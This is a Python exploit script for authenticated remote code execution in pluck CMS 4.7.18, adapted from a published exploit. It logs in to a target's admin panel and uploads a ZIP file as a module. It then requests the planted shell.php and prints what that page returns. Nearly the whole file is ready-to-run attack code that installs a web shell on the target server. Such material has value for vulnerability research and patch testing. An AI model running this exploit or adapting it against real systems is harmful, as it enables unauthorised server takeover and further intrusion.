#!/usr/bin/env python3

# Modified version of:
#Exploit Title: pluck v4.7.18 - RCE
#Application: pluck
#Version: 4.7.18
#Bugs:  RCE
#Technology: PHP
#Vendor URL: https://github.com/pluck-cms/pluck
#Software Link: https://github.com/pluck-cms/pluck
#Date of found: 10-07-2023
#Author: Mirabbas Ağalarov
#Tested on: Linux

import argparse
import requests

# Parse url arguments
parser = argparse.ArgumentParser()
parser.add_argument('--url', required=True, help="Specify domain, e.g. foo.bar")
parser.add_argument('--username','-u', required=True, help="Add an username")
parser.add_argument('--password', '-p', required=True, help="Add a password")
args = parser.parse_args()
exp_url = f"http://{args.url}"

from requests_toolbelt.multipart.encoder import MultipartEncoder

login_url = f"{exp_url}/login.php"
upload_url = f"{exp_url}/admin.php?action=installmodule"
headers = {"Referer": login_url,}
login_payload = {
    args.username: "",
    "cont1": args.password,
    "submit": "Log in"
}

file_path = input("ZIP file path: ")

multipart_data = MultipartEncoder(
    fields={
        "sendfile": ("exploit.zip", open(file_path, "rb"), "application/zip"),
        "submit": "Upload"
    }
)

session = requests.Session()
login_response = session.post(login_url, headers=headers, data=login_payload)


if login_response.status_code == 200:
    print("An evil Loempia Login account")


    upload_headers = {
        "Referer": upload_url,
        "Content-Type": multipart_data.content_type
    }
    upload_response = session.post(upload_url, headers=upload_headers, data=multipart_data)


    if upload_response.status_code == 200:
        print("Evil loempia is uploaded succesfull.")
    else:
        print("ZIP file download error. Response code:", upload_response.status_code)
else:
    print("Login problem. response code:", login_response.status_code)

# rename to your likings if you don't have an exploit.zip and shell.php
rce_url = f"{exp_url}/data/modules/exploit/shell.php"

rce=requests.get(rce_url)

print(rce.text)
